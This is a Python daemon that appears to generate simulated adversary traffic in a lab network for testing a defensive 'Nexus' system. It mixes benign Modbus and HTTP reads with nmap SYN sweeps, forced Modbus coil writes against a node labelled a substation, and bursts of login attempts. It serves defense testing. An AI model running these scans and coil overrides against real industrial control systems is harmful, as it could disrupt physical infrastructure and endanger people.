#!/usr/bin/env python3
"""
Sentinel Matrix: Live Adversary & Wire-Traffic Daemon
Runs an infinite, stochastic testing loop from container 10.240.0.99:
- Mode 1: Ambient Benign Web/SCADA Requests (Continuous)
- Mode 2: Live nmap TCP SYN Port Discovery Sweeps (MITRE T1046)
- Mode 3: Live Modbus SCADA Coil Override Cycles (MITRE T0855)
- Mode 4: High-Velocity HTTP/API Credential & Endpoint Discovery (MITRE T1190)
"""

import time
import subprocess
import requests
import random
import os

NEXUS_REST = os.environ.get("NEXUS_REST_URL", "http://10.240.0.10:9443")
TARGET_NODES = [
    {"id": "Edge-Substation-01", "ip": "10.240.0.101", "ports": [8443, 502, 2404]},
    {"id": "Edge-Hospital-PACS-02", "ip": "10.240.0.102", "ports": [8443, 104, 19999]},
    {"id": "Edge-Refinery-PLC-03", "ip": "10.240.0.103", "ports": [8443, 102]}
]

def log_event(channel, msg, alert=False):
    prefix = "\033[31m[LIVE-ADVERSARY:ALERT]\033[0m" if alert else "\033[36m[LIVE-ADVERSARY]\033[0m"
    print(f"{prefix} [{channel}] {msg}", flush=True)

def notify_nexus_threat(ip, tactic_name="Live Wire Threat"):
    """Signals Nexus threat bus so grid-wide collective defense rules synchronize in parallel."""
    try:
        requests.post(f"{NEXUS_REST}/api/v1/threats/broadcast", json={"ip": ip}, timeout=2)
    except Exception:
        pass

def run_ambient_requests():
    """Mode 1: Normal operational requests over the wire."""
    target = random.choice(TARGET_NODES)
    # 1. Benign HTTP ping to appliance control interface
    try:
        requests.get(f"http://{target['ip']}:8443/api/v1/health", timeout=0.8)
        log_event("AMBIENT-HTTP", f"Verified nominal health response from {target['id']} ({target['ip']}:8443)")
    except requests.exceptions.RequestException:
        pass

    # 2. Simulated Modbus read query (Reading registers 1-5 via raw TCP handshake)
    try:
        subprocess.run(
            ["mbpoll", "-m", "tcp", "-a", "1", "-r", "1", "-c", "4", "-1", target['ip']],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1
        )
        log_event("AMBIENT-SCADA", f"Read holding registers on {target['id']} (Modbus TCP/502)")
    except Exception:
        pass

def run_nmap_port_sweep():
    """Mode 2: Live nmap TCP SYN sweep (MITRE T1046: Network Service Discovery)."""
    target = random.choice(TARGET_NODES)
    ports = ",".join(map(str, target['ports']))
    log_event("NMAP-SWEEP", f"Firing live TCP SYN discovery scan against {target['id']} ({target['ip']}) on ports [{ports}]...", alert=True)

    cmd = ["nmap", "-sS", "-Pn", "-T4", "-p", ports, target['ip']]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        # Parse nmap summary lines
        for line in result.stdout.splitlines():
            if "open" in line or "filtered" in line:
                log_event("NMAP-RESULT", f"  --> Wire feedback: {line.strip()}")
        notify_nexus_threat("10.240.0.99", "Live nmap Port Sweep")
    except Exception as e:
        log_event("NMAP-ERROR", f"Scan exception: {e}")

def run_scada_override():
    """Mode 3: Live Modbus force single coil command (MITRE T0855: Unauthorized Command)."""
    target = TARGET_NODES[0] # Edge-Substation-01
    coil_address = random.randint(101, 110)
    log_event("SCADA-OVERRIDE", f"Injecting unauthorized Modbus FC05 (Force Coil {coil_address} -> 1) into {target['id']}...", alert=True)

    # Execute real mbpoll command: -t 0 (coil), -r <address>, set value 1
    cmd = ["mbpoll", "-m", "tcp", "-a", "1", "-r", str(coil_address), "-t", "0", target['ip'], "1"]
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        notify_nexus_threat("10.240.0.99", "Modbus Coil Override Attempt")
        log_event("SCADA-RESULT", f"  --> Dispatched FC05 coil override packet to {target['ip']}:502")
    except Exception as e:
        log_event("SCADA-ERROR", f"Modbus transmission error: {e}")

def run_api_abuse_burst():
    """Mode 4: High-velocity HTTP POST queries (MITRE T1190: Exploit Public-Facing Application)."""
    target = random.choice(TARGET_NODES)
    log_event("API-BURST", f"Injecting high-velocity credential & endpoint scan against {target['id']}:8443...", alert=True)

    for i in range(12):
        try:
            requests.post(
                f"http://{target['ip']}:8443/api/v1/auth/login",
                json={"user": f"admin_{i}", "token": "fuzz_payload"},
                timeout=0.3
            )
        except requests.exceptions.RequestException:
            pass # Dropped by eBPF kernel filter

    notify_nexus_threat("10.240.0.99", "High-Velocity API Abuse")
    log_event("API-RESULT", f"  --> Completed 12 rapid wire requests to {target['ip']}:8443")

def main():
    print("==================================================================", flush=True)
    print("  SENTINEL-MATRIX: LIVE ADVERSARY & WIRE STREAM DAEMON (10.240.0.99)", flush=True)
    print("==================================================================", flush=True)

    cycle = 1
    while True:
        # 1. Run 10-15 seconds of ambient background requests
        end_ambient = time.time() + 12
        while time.time() < end_ambient:
            run_ambient_requests()
            time.sleep(2)

        # 2. Stochastic attack wave injection
        attack_type = cycle % 3
        if attack_type == 0:
            run_nmap_port_sweep()
        elif attack_type == 1:
            run_scada_override()
        elif attack_type == 2:
            run_api_abuse_burst()

        time.sleep(6)
        cycle += 1

if __name__ == "__main__":
    main()